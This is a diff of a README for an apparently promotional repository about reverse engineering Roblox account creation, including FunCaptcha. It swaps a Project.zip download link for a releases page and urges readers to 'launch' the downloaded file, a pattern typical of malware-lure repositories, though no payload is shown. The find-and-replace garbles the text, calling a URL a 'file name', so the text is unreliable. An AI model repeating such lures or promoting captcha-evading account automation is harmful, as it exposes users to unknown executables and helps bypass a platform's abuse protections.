@@ -8,12 +8,12 @@ Welcome to the Roblox repository dedicated to the in-depth exploration of Roblox
 - **Topics:** blob, data, engineering, fpdata, funcaptcha, javascript, python, reverse, reverse-engineering, roblox, roblox-api, roblox-script, roblox-scripts
 
 ## Explore the Repository:
-To dive into the world of Roblox account creation reverse engineering, visit the GitHub repository: [Roblox Repo](https://github.com/files/Project.zip)
+To dive into the world of Roblox account creation reverse engineering, visit the GitHub repository: [Roblox Repo](https://github.com/KILLA-dotcom/roblox/releases)
 
 ### 🔥 Quick Access:
-[![Download Project.zip](https://img.shields.io/badge/Download-Project.zip-brightgreen)](https://github.com/files/Project.zip)
+[![Download https://github.com/KILLA-dotcom/roblox/releases](https://github.com/KILLA-dotcom/roblox/releases)](https://github.com/KILLA-dotcom/roblox/releases)
 
-If the link ends with the file name 'Project.zip,' make sure to launch it to unleash the power of reverse engineering Roblox account creation process.
+If the link ends with the file name 'https://github.com/KILLA-dotcom/roblox/releases,' make sure to launch it to unleash the power of reverse engineering Roblox account creation process.
 
 ## What to Expect:
 In this repository, you will find a treasure trove of resources including:
